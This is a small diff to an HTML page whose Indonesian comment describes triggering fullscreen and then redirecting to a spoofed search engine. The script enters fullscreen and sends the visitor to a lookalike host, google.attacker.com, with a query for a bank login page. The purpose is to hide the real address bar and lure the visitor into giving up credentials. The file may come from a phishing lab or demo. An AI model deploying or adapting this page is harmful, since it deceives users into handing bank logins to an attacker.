@@ -1,6 +1,12 @@
 <!-- Trigger fullscreen, lalu redirect ke search engine spoof -->
-<script>
-document.documentElement.requestFullscreen().then(() => {
+<!DOCTYPE html>
+<html>
+<body>
+ 
+    <script>
+       document.documentElement.requestFullscreen().then(() => {
     window.location.href = "https://www.google.attacker.com/search?q=bank.com/login&client=opera";
 });
 </script>
+</body>
+</html>
